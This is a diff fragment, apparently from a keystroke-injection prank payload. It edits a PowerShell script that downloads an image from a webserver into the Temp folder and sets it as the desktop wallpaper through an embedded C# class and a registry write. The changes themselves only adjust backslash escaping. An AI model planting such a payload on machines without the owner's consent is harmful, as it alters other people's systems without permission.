@@ -11,7 +11,8 @@ ENTER
 
 The Powershell script on your webserver (http://your-website.com/powershellscript.ps):
 ---------------------------------------------------------------------
-(new-object System.Net.WebClient).DownloadFile('http://your-website.com/mylittlepony.jpg',"$Env:Temp\b.jpg");
+
+(new-object System.Net.WebClient).DownloadFile('http://your-website.com/mylittlepony.jpg',"$Env:Temp\\b.jpg");
 
 Add-Type @"
 
@@ -47,7 +48,7 @@ namespace Wallpaper
 
      SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
 
-     RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
+     RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\\\Desktop", true);
 
      switch( style )
 
